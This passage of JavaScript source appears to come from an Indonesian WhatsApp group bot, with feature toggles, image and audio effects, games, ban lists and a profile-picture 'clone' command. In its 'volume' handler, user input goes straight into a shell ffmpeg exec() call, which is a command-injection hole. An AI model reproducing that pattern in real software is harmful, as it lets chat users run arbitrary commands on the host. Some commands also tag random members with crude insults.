reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE ANTI DELETE`, `Choose one`, [
            {
              buttonId: 'antidelete on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antidelete off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'welcome':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (welcome === true) return reply(lang.anjawaUdhOn(command))
welcome = true
leave = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (welcome === false) return
welcome = false
leave = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO WELCOME`, `Choose one`, [
            {
              buttonId: 'welcome on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'welcome off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'anticall':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (antical === true) return reply(lang.anjawaUdhOn(command))
antical = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antical === false) return
antical = false
reply(lang.anjawaOff(command))
} else {
reply(lang.onORoff(command))
}
break
case 'autoketik':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autoketik === true) return reply(lang.anjawaUdhOn(command))
autoketik = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO KETIK`, `Choose one`, [
            {
              buttonId: 'autoketik on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autoketik off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'autorespon': case 'autorespond':
      if (!isOwner && !isCreator && !mek.key.fromMe) return reply(lang.onlyOwner())
       if (q === 'on'){
           	if (autorespon === false) return reply(lang.anjawaUdhOn(command))
              autorespon = false
                    reply(lang.anjawaOn(command))
                } else if (q === 'off'){
                	if (autorespon === true) return
                    autorespon = true
                    reply(lang.anjawaOff(command))
                } else if (!q) {
          sendButMessage(from, `MODE AUTO RESPON`, `Choose one`, [
            {
              buttonId: 'autorespon on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autorespon off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'autobio':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autobio === true) return reply(lang.anjawaUdhOn(command))
autobio = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autobio === false) return
autobio = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO BIO`, `Choose one`, [
            {
              buttonId: 'autobio on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autobio off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'antihidetag':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (antihidetag === true) return reply(lang.anjawaUdhOn(command))
antihidetag = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (antihidetag === false) return
antihidetag = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE ANTI HIDETAG`, `Choose one`, [
            {
              buttonId: 'antihidetag on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'antihidetag off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'autovn':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autovn === true) return reply(lang.anjawaUdhOn(command))
autovn = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO VN`, `Choose one`, [
            {
              buttonId: 'autovn on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'autovn off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
        case 'autoregis': case 'register':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (args[0] === "on") {
if (autoregister === true) return reply(lang.anjawaUdhOn(command))
autoregister = true
reply(lang.anjawaOn(command))
} else if (args[0] === "off") {
if (autoregister === false) return
autoregister = false
reply(lang.anjawaOff(command))
} else if (!q) {
          sendButMessage(from, `MODE AUTO REGISTER`, `Choose one`, [
            {
              buttonId: 'register on',
              buttonText: {
                displayText: `On`,
              },
              type: 1,
            },
            {
              buttonId: 'register off',
              buttonText: {
                displayText: `Off`,
              },
              type: 1,
            },
          ]);
        }
        break;
case 'wanted':case 'utatoo':case 'unsharpen':case 'thanos':case 'sniper':case 'sharpen':case 'sepia':case 'scary':case 'rip':case 'redple':case 'rejected':case 'posterize':case 'ps4':case 'pixelize':case 'missionpassed':case 'moustache':case 'lookwhatkarenhave':case 'jail':case 'invert':case 'instagram':case 'greyscale':case 'glitch':case 'gay':case 'frame':case 'fire':case 'distort':case 'dictator':case 'deepfry':case 'ddungeon':case 'circle':case 'challenger':case 'burn':case 'brazzers':case 'beautiful':
console.log(command + '  -> Mungkin fitur ini masih suka eror ngab jadi fix sendiri ya')
       if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					let cicle = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
					reply(lang.wait())
					var ini_gen = `${command}`
					var ciclee = await alpha.downloadMediaMessage(cicle)
				    var annnu = await uploadImages(ciclee)
					var imoj = await ameApi.generate(ini_gen, { url: annnu})
				     .then( async image =>{

        			await fs.writeFileSync('./media/foto/circle.jpg', image)

					alpha.sendMessage(from, fs.readFileSync('./media/foto/circle.jpg'), MessageType.image,{quoted: mek, caption: '.stikerin', thumbnail: Buffer.alloc(0)})
			     })
				} else {
					reply(lang.replyFoto())
					}
					await limitAdd(sender, limit)
					break   
 case 'volume':
if (!isQuotedAudio) return reply('Reply audio!')
let encmedia3 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let media3 = await alpha.downloadAndSaveMediaMessage(encmedia3)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media3)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
alpha.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: ftroli})
fs.unlinkSync(rname)
}
)
await limitAdd(sender, limit)
					break   
case 'balik':
if (!isQuotedAudio) return reply('Reply audio!')
	let encmedia4 = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	let media4 = await alpha.downloadAndSaveMediaMessage(encmedia4)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media4} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media4)
if (err) return reply('emror')
hihi = fs.readFileSync(ran)
alpha.sendMessage(from, hihi, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
fs.unlinkSync(ran)
	})
await limitAdd(sender, limit)
					break   
break
			case 'banlist': case 'blocklist': case 'listban': case 'listblock': 
          teks = '╭────「 *BANNED  LIST* 」\n'
          for (let hui of banned) {
            teks += `│+  @${hui.split('@')[0]}\n`
          }
          teks += `│+ Total : ${banned.length}\n╰──────「 *ALPHA BOT* 」────`
          alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": [hui] } })
          break
 		case 'ban': case 'banned': case 'block':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
					banned.push(bnnd)
					fs.writeFileSync('./src/banned.json', JSON.stringify(banned))
					fakestatus(`Nomor ${bnnd} telah dibanned!`)
          break

        case 'unban': case 'unbannned': case 'unblock':
          if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
          ya = `${args[0].replace('@', '')}@s.whatsapp.net`
					unb = banned.indexOf(ya)
					banned.splice(unb, 1)
					fs.writeFileSync('./src/banned.json', JSON.stringify(banned))
					fakestatus(`Nomor ${ya} telah di unban!`)
          break
          case 'darkjokes':
					let data = fs.readFileSync('./src/darkjokes.js');
					jsonData = JSON.parse(data);
					randIndex = Math.floor(Math.random() * jsonData.length);
					randKey = jsonData[randIndex];
					hasil = await getBuffer(randKey.result)
					alpha.sendMessage(from, hasil, image, {thumbnail: Buffer.alloc(0), quoted: fgclink})
					await limitAdd(sender, limit)
					break
			case 'sound1': case 'sound2': case 'sound3': case 'sound4': case 'sound5': case 'sound6': case 'sound7': case 'sound8': case 'sound9': case 'sound10': case 'sound11': case 'sound12': case 'sound13': case 'sound14': case 'sound15': case 'sound16': case 'sound17': case 'sound18 ': case 'sound19': case 'sound20': case 'sound21': case 'sound22': case 'sound23': case 'sound24': case 'sound25': case 'sound26': case 'sound27': case 'sound28': case 'sound29': case 'sound30': case 'sound31': case 'sound32': case 'sound33': case 'sound34': case 'sound35': case 'sound36': case 'sound37': case 'sound38': case 'sound39': case 'sound40': case 'sound41': case 'sound42': case 'sound43': case 'sound44': case 'sound45': case 'sound46': case 'sound47': case 'sound48': case 'sound49': case 'sound50': case 'sound51': case 'sound52': case 'sound53': case 'sound54': case 'sound55': case 'sound56': case 'sound57': case 'sound58': case 'sound59': case 'sound60': case 'sound61': case 'sound62': case 'sound63': case 'sound64': case 'sound65': case 'sound66': case 'sound67': case 'sound68': case 'sound69': case 'sound70':
						let sound1 = await getBuffer(alphaapi + '/sound/' + command +'?apikey=' + alphakey)   
						alpha.sendMessage(from, sound1, audio, {mimetype: 'audio/mp4', quoted:fvn, ptt:true})
						break
					/*case 'save':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if(!q) return reply(`${prefix}save nama|nomor , Nomor Harus Berupa Kode Negara 62xxx`)
nma = q.split('|')[0]
nmor = q.split('|')[1]
if(!nma) return reply('Format salah!')
if(!nmor) return reply('Format salah!')
H1 = {
nama : nma,
nomor : nmor
}
save.push(H1)
fs.writeFileSync('./lib/sv.js', JSON.stringify(save))
alpha.sendMessage(from, `Oke Sudag Tersimpan`, MessageType.text, { quoted: mek})		     	 
break
case 'mutual':
data = fs.readFileSync('./lib/sv.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
randIndex2 = Math.floor(Math.random() * jsonData.length);
randKey2 = jsonData[randIndex2];
randIndex3 = Math.floor(Math.random() * jsonData.length);
randKey3 = jsonData[randIndex3];
let mutual = `*Nama*: ${randKey.nama}\n*Nomor*: wa.me/${randKey.nomor}\n\n*Nama*: ${randKey2.nama}\n*Nomor*: wa.me/${randKey2.nomor}\n\n*Nama*: ${randKey3.nama}\n*Nomor*: wa.me/${randKey3.nomor}`
reply(mutual)
break*/
		
			case 'clone':
if (!mek.key.fromMe && !isOwner && !isCreator) return reply(lang.onlyOwner())
if (!isGroup) return reply(lang.onlygc())
if (args.length < 1) return reply('Tag target yang ingin di clone')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, idk, notify } = groupMembers.find(x => x.jid === mentioned)
try {
var pp = await alpha.getProfilePicture(idk)
buffer = await getBuffer(pp)
alpha.updateProfilePicture(botNumber, buffer)
mentions(`Foto profile Berhasil di perbarui menggunakan foto profile @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply('Emror')
}
break
case 'tes': case 'bot':
var ini_gopayyp = `${ucapannya2}\nBot sudah on kak silahkan di pakai`
var buttonsos = [
{buttonId: 'Menu', buttonText: {displayText: 'Menu'}, type: 1},
{buttonId: 'runtime', buttonText: {displayText: 'Runtime'}, type: 1}]

butptonMessagee = {
contentText: ini_gopayyp,
footerText: `${tampilTanggal}\n${tampilWaktu}` ,
buttons: buttonsos,
headerType: 1
}
alpha.sendMessage(from,  butptonMessagee, MessageType.buttonsMessage,{
        caption: 'Botwea ©2k21',
        "contextInfo": {
            text: 'hi',
            "forwardingScore": 1000000000,
            isForwarded: true,
            sendEphemeral: true,
            "mentionedJid" : [sender]
            },
			quoted: fgclink,sendEphemeral: true 
			})
			break
case 'absensi':
                 if (!isGroup) return reply(lang.onlygc())
absen.push(sender)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
teks = `*LIST DAFTAR HADIR ABSEN*:${enter}`
for (let sensi of absen) {
teks += `${enter}々 @${sensi.split('@')[0]} ✓${enter}`
}
teks += `TOTAL MEMBER YG ABSEN : ${absen.length}${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`
alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": absen}})
break

case 'absen':
if (!isGroup) return reply(lang.onlygc())
if (args.length < 1) return reply(`Cara Memulai Absen Silahkan Ketik${enter}${enter}${prefix}absen waktu${enter}${enter}list menit yang tersedia.${enter}${enter}600000 | 1200000 | 1800000${enter}${enter}jadi ${prefix}absen 600000`)
tem = args.join(" ")
ini = absen.indexOf(from)
absen.splice(ini, 1)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
teks = `*LIST DAFTAR HADIR*:${enter}`
for (let sensi of absen) {
teks += `${enter}々 @${sensi.split('@')[0]} ✓${enter}`
}
teks += `ABSENSI : ${sensi.length}${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`
reply(`List Presentasi Hadir Telah Siap${enter}${enter}Ketik ${prefix}absensi untuk absen, Daftar list absen akan dikumpulkan setelah waktu yang diberikan telah berakhir!`)
setTimeout( () => {
reply(`Waktu Absensi Telah Habis`)
alpha.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": absen}})
}, tem)
setTimeout( () => {
ini = absen.indexOf(from)
absen.splice(ini, 1)
fs.writeFileSync('./src/absen.json', JSON.stringify(absen))
}, tem)
break

		  case 'tebakin': case 'tebakgambar':
		if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/tebakgambar?apikey=${alphakey}`)
                    //resu = anu.data
                    tebak = anu.data.image
                    jawaban = `${anu.data.jawaban.replace('Jawaban ', '')}`
                    tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tebakgambar.json", JSON.stringify(tebakgambar))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    alpha.sendMessage(from, tebakya, image, {quoted: mek, caption: "\n\n⏰ Timeout : 120.00 seconds\n🎁 + Exp 500\n💰 + Balance $10" })
                    await sleep(120000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                                alpha.sendMessage(from, "Waktu permainan habis" + '\n\n' +"*➸ Jawaban :*"  + '\n' + '_'+ jawaban +'_', text, {quoted: mek}) // ur cods
								delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./src/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    await limitAdd(sender, limit)
					break   
				case 'siapakahaku': case 'siapaaku':
		if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (siapakahaku.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/siapakahaku?apikey=${alphakey}`)
                    jawaban = `${anu.data.jawaban}`
                    siapakahaku[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/siapakahaku.json", JSON.stringify(siapakahaku))
                    console.log(jawaban)
                    tebakya = anu.data.pertanyaan
                    alpha.sendMessage(from, tebakya + '\n\n⏰ Timeout : 120.00 seconds\n🎁 + Exp 500\n💰 + Balance $10' , text, {quoted: mek})
                    await sleep(120000)
                    if (siapakahaku.hasOwnProperty(sender.split('@')[0])) {
                                alpha.sendMessage(from, "⏰ Waktu permainan habis ⏰" + '\n\n' +"*🔥 Jawaban :*"  + '' + '_'+ jawaban +'_', text, {quoted: mek}) // ur cods
								delete siapakahaku[sender.split('@')[0]]
                        fs.writeFileSync("./src/siapakahaku.json", JSON.stringify(siapakahaku))
                    }
                    await gameAdd(sender, glimit)
					break   
				case 'tebakkalimat':
		if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (tebakkalimat.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/tebakkalimat?apikey=${alphakey}`)
                    jawaban = `${anu.data.jawaban}`
                    tebakkalimat[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tebakkalimat.json", JSON.stringify(tebakkalimat))
                    console.log(jawaban)
                    tebakya = anu.data.soal
                    alpha.sendMessage(from, tebakya + '\n\n⏰ Timeout : 120.00 seconds\n🎁 + Exp 500\n💰 + Balance $10' , text, {quoted: mek})
                    await sleep(120000)
                    if (tebakkalimat.hasOwnProperty(sender.split('@')[0])) {
                                alpha.sendMessage(from, "⏰ Waktu permainan habis ⏰" + '\n\n' +"*🔥 Jawaban :*"  + '' + '_'+ jawaban +'_', text, {quoted: mek}) // ur cods
								delete tebakkalimat[sender.split('@')[0]]
                        fs.writeFileSync("./src/tebakkalimat.json", JSON.stringify(tebakkalimat))
                    }
                    await gameAdd(sender, glimit)
					break   
				case 'tebakkata':
		if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (tebakkata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/tebakkata?apikey=${alphakey}`)
                    jawaban = `${anu.data.jawaban}`
                    tebakkata[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tebakkata.json", JSON.stringify(tebakkata))
                    console.log(jawaban)
                    tebakya = anu.data.soal
                    alpha.sendMessage(from, tebakya + '\n\n⏰ Timeout : 120.00 seconds\n🎁 + Exp 500\n💰 + Balance $10' , text, {quoted: mek})
                    await sleep(120000)
                    if (tebakkata.hasOwnProperty(sender.split('@')[0])) {
                                alpha.sendMessage(from, "⏰ Waktu permainan habis ⏰" + '\n\n' +"*🔥 Jawaban :*"  + '' + '_'+ jawaban +'_', text, {quoted: mek}) // ur cods
								delete tebakkata[sender.split('@')[0]]
                        fs.writeFileSync("./src/tebakkata.json", JSON.stringify(tebakkata))
                    }
                    await gameAdd(sender, glimit)
					break   
					case 'tebaklirik':
		if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/tebaklirik?apikey=${alphakey}`)
                    jawaban = `${anu.data.jawaban}`
                    tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tebaklirik.json", JSON.stringify(tebaklirik))
                    console.log(jawaban)
                    tebakya = anu.data.soal
                    alpha.sendMessage(from, tebakya + '\n\n⏰ Timeout : 120.00 seconds\n🎁 + Exp 500\n💰 + Balance $10' , text, {quoted: mek})
                    await sleep(120000)
                    if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {
                                alpha.sendMessage(from, "⏰ Waktu permainan habis ⏰" + '\n\n' +"*🔥 Jawaban :*"  + '' + '_'+ jawaban +'_', text, {quoted: mek}) // ur cods
								delete tebaklirik[sender.split('@')[0]]
                        fs.writeFileSync("./src/tebaklirik.json", JSON.stringify(tebaklirik))
                    }
                    await gameAdd(sender, glimit)
					break   
				case 'tekateki':
		if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (tekateki.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/tekateki?apikey=${alphakey}`)
                    jawaban = `${anu.data.jawaban}`
                    tekateki[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tekateki.json", JSON.stringify(tekateki))
                    console.log(jawaban)
                    tebakya = anu.data.soal
                    alpha.sendMessage(from, tebakya + '\n\n⏰ Timeout : 120.00 seconds\n🎁 + Exp 500\n💰 + Balance $10' , text, {quoted: mek})
                    await sleep(120000)
                    if (tekateki.hasOwnProperty(sender.split('@')[0])) {
                                alpha.sendMessage(from, "⏰ Waktu permainan habis ⏰" + '\n\n' +"*🔥 Jawaban :*"  + '' + '_'+ jawaban +'_', text, {quoted: mek}) // ur cods
								delete tekateki[sender.split('@')[0]]
                        fs.writeFileSync("./src/tekateki.json", JSON.stringify(tekateki))
                    }
                    await gameAdd(sender, glimit)
					break  
				case 'susunkata':
		if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (tekateki.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/susunkata?apikey=${alphakey}`)
                    jawaban = `${anu.data.jawaban}`
                    tipenya = `${anu.data.tipe}`
                    susunkata[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/susunkata.json", JSON.stringify(susunkata))
                    console.log(jawaban)
                    tebakya = anu.data.acak
                    alpha.sendMessage(from, "Soal : " + tebakya + '\n' +"Tipe : " + tipenya + '\n\n⏰ Timeout : 120.00 seconds\n🎁 + Exp 500\n💰 + Balance $10' , text, {quoted: mek})
                    await sleep(120000)
                    if (susunkata.hasOwnProperty(sender.split('@')[0])) {
                                alpha.sendMessage(from, "⏰ Waktu permainan habis ⏰" + '\n\n' +"*🔥 Jawaban :*"  + '' + '  '+ jawaban +'', text, {quoted: mek}) // ur cods
								delete susunkata[sender.split('@')[0]]
                        fs.writeFileSync("./src/susunkata.json", JSON.stringify(susunkata))
                    }
                    await gameAdd(sender, glimit)
					break  
				case 'caklontong':
				if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/caklontong?apikey=${alphakey}`)
                    tebakya = anu.result.data.soal
                    tebak = `Pertanyaan : ${tebakya}`
                    jawaban = anu.result.data.jawaban
                    desc = anu.result.data.desc
                    caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/caklontong.json", JSON.stringify(caklontong))
                    console.log(jawaban)
                    alpha.sendMessage(from, tebak + '\n\n⏰ Timeout : 120.00 seconds\n🎁 + Exp 500\n💰 + Balance $10', text, { quoted: mek })
                   await sleep(120000)
                    if (caklontong.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban + '\n' + "Desc : " + desc )
                        delete caklontong[sender.split('@')[0]]
                        fs.writeFileSync("./src/caklontong.json", JSON.stringify(caklontong))
                    }
                    await gameAdd(sender, glimit)
					break   
				case 'family100':
				if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (family.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`${alphaapi}/game/family100?apikey=${alphakey}`)
                    tebak = `Pertanyaan : ${anu.result.data.soal}`
                    jawaban = anu.result.data.jawaban
                    family[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/family100.json", JSON.stringify(family))
                    console.log(jawaban)
                    alpha.sendMessage(from, tebak + '\n\n⏰ Timeout : 120.00 seconds\n🎁 + Exp 500\n💰 + Balance $10', text, { quoted: mek })
                   await sleep(120000)
                    if (family.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete family[sender.split('@')[0]]
                        fs.writeFileSync("./src/family100.json", JSON.stringify(family))
                    }
                    await gameAdd(sender, glimit)
					break   
				case 'tebakanime':
				if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
					if (tebakanime.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada permainan yang sedang berlangsung")
                    anu = await fetchJson(`https://x-restapi.herokuapp.com/api/tebak-anime?apikey=BETA`)
                    tebak = anu.soal
                    jawaban = anu.jawaban
                    tebakanime[sender.split('@')[0]] = jawaban.toLowerCase()
                    fs.writeFileSync("./src/tebakanime.json", JSON.stringify(tebakanime))
                    console.log(jawaban)
                    tebakya = await getBuffer(tebak)
                    alpha.sendMessage(from, tebakya + '\n\n⏰ Timeout : 120.00 seconds\n🎁 + Exp 500\n💰 + Balance $10', image, { quoted: mek, caption: "Jawaban salah auto harus donasi" })
                   await sleep(120000)
                    if (tebakanime.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakanime[sender.split('@')[0]]
                        fs.writeFileSync("./src/tebakanime.json", JSON.stringify(tebakanime))
                    }
                    await gameAdd(sender, glimit)
					break   
            case 'suit': 
            if (isGame(sender, isPremium, isCreator, isOwner, gcounttuser, glimit)) return sendButMessage(from, lang.limitg(prefix), `© ${ownername}`, [{buttonId: 'limit', buttonText: {displayText: `Check Limit`, },type: 1,}]);
              if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
              const userspilih = q
              if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
              var computer = Math.random();
              if (computer < 0.34 ) {
              computer = 'batu';
              } else if( computer >= 0.34 && computer < 0.67) {
              computer = 'gunting';
              } else {
              computer = 'kertas';
}
              if ( userspilih == computer ) {
              reply(`Pertandingan Seri!`)
              } else if ( userspilih == 'batu' ) {
              if( computer == 'gunting' ) {
              reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
              } else {
              reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
}
              } else if ( userspilih == 'gunting' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
              } else {
              reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
}
              } else if ( userspilih == 'kertas' ) {
              if( computer == 'batu' ) {
              reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
              } else {
              reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
}
}
              await gameAdd(sender, glimit)
					break   
       case 'ganteng': case 'cantik': case 'jelek': case 'goblok':  case 'bego': case 'pinter': case 'jago': case 'nolep': case 'monyet':  case 'babi': case 'beban': case 'baik': case 'jahat': case 'anjing': case 'haram': case 'kontol': case 'pakboy': case 'pakgirl': case 'wibu': case 'hebat': case 'sadboy': case 'sadgirl':  
               	await gameAdd(sender, glimit)
				   if (!isGroup) return reply(lang.onlygc()) 
 				   jds = []
				   const A1 = groupMembers
  		 		const B1 = groupMembers
 				   const C1 = A1[Math.floor(Math.random() * A1.length)]
				   D1 = `Yang *ter${command}* disini adalah @${C1.jid.split('@')[0]}`                  
				   jds.push(C1.jid)
				   mentions(D1, jds, true)
				   break
				default:
				
if(subscribezeeoneofc == 'qr_gopay1'){
	gambar_gopay = `${qr_code_gopay}`
	let gambar_gopay_nya = await getBuffer(gambar_gopay)
	send_qr_gopay(gambar_gopay_nya, mek)
}    
if(subscribezeeoneofc == 'qr_dana1'){
	gambar_dana = `${qr_code_dana}`
	let gambar_dana_nya = await getBuffer(gambar_dana)
	send_qr_dana(gambar_dana_nya, mek)
}    
if(subscribezeeoneofc == 'qr_ovo1'){
	gambar_ovo = `${qr_code_ovo}`
	let gambar_ovo_nya = await getBuffer(gambar_ovo)
	send_qr_ovo(gambar_ovo_nya, mek)
}    
